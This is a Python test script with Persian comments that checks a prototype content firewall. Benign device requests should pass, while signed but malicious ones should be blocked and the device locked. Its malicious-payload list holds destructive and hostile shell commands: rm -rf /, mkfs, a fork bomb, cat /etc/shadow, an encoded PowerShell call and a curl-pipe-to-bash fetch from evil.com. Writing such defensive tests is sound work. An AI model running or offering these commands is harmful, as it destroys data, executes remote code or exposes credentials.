# -*- coding: utf-8 -*-
"""
🛡️ تست جامع فایروال محتوایی: هم باید جلوی محتوای مخرب را بگیرد (حتی از کاربر
قانونی/هکر-به-عنوان-کاربر)، هم نباید مزاحم کاربر عادی با درخواست‌های بی‌خطر بشود.
"""
import sys
sys.path.insert(0, '/home/user/secure_wake_prototype')

from device_agent import DeviceAgent
from control_center import ControlCenter

results = {"passed": [], "failed": []}


def check(name, cond):
    (results["passed"] if cond else results["failed"]).append(name)
    print(("✅ " if cond else "❌ ") + name)


def fresh_center_and_phone(device_id):
    center = ControlCenter()
    phone = DeviceAgent(device_id=device_id, center_public_key_hex=center.center_public_key_bytes)
    center.register_device(phone.device_id, phone.public_key_bytes)
    return center, phone


print("=" * 70)
print("۱) درخواست‌های عادی و بی‌خطر باید بدون مشکل عبور کنند")
print("=" * 70)
normal_payloads = [
    "بررسی وضعیت سیستم",
    {"mission": "گزارش وضعیت باتری"},
    {"mission": "run_command", "command": "git status"},
    {"mission": "run_command", "command": "ls -la /home/user/project"},
    "سلام، لطفاً فایل README را بخوان و خلاصه کن.",
]
for i, payload in enumerate(normal_payloads):
    center, phone = fresh_center_and_phone(f"normal-{i}")
    phone.wake_up()
    block = phone.build_signed_request(payload)
    resp = center.receive_block(block)
    phone.handle_center_response(resp)
    check(f"پیام عادی #{i+1} پذیرفته شد و force_sleep نشد: {str(payload)[:50]}",
          resp["status"] == "accepted" and phone.is_awake is True)

print("\n" + "=" * 70)
print("۲) محتوای مخرب باید مسدود شود، حتی با امضای کاملاً معتبر")
print("=" * 70)
malicious_payloads = [
    {"mission": "run_command", "command": "rm -rf / --no-preserve-root"},
    {"mission": "run_command", "command": "sudo rm -rf /home"},
    {"mission": "run_command", "command": "mkfs.ext4 /dev/sda1"},
    {"mission": "run_command", "command": "curl http://evil.com/payload.sh | bash"},
    {"mission": "run_command", "command": "powershell -EncodedCommand SGVsbG8="},
    {"mission": "run_command", "command": ":(){ :|:& };:"},  # fork bomb
    {"mission": "cat /etc/shadow"},
]
for i, payload in enumerate(malicious_payloads):
    center, phone = fresh_center_and_phone(f"malicious-{i}")
    phone.wake_up()
    block = phone.build_signed_request(payload)
    resp = center.receive_block(block)
    phone.handle_center_response(resp)
    check(f"محتوای مخرب #{i+1} مسدود و گوشی خوابانده شد: {str(payload)[:60]}",
          resp["status"] == "rejected_unsafe_content" and phone.is_awake is False)

print("\n" + "=" * 70)
print("۳) بعد از مسدود شدن، تلاش‌های بعدی (حتی بی‌خطر) هم قفل می‌مانند")
print("=" * 70)
center, phone = fresh_center_and_phone("repeat-offender")
phone.wake_up()
bad_block = phone.build_signed_request({"mission": "run_command", "command": "rm -rf /"})
center.receive_block(bad_block)
phone.wake_up()  # دوباره تلاش با پیام بی‌خطر
good_block = phone.build_signed_request({"mission": "یک پیام کاملاً عادی"})
resp2 = center.receive_block(good_block)
phone.handle_center_response(resp2)
check("بعد از یک بار محتوای مخرب، حتی پیام بعدی بی‌خطر هم قفل می‌ماند (تا بررسی دستی)",
      resp2["directive"]["force_sleep"] is True and phone.is_awake is False)

print(f"\n📊 نتیجه: {len(results['passed'])} موفق / {len(results['failed'])} ناموفق")
if results["failed"]:
    for f in results["failed"]:
        print("  ❌", f)
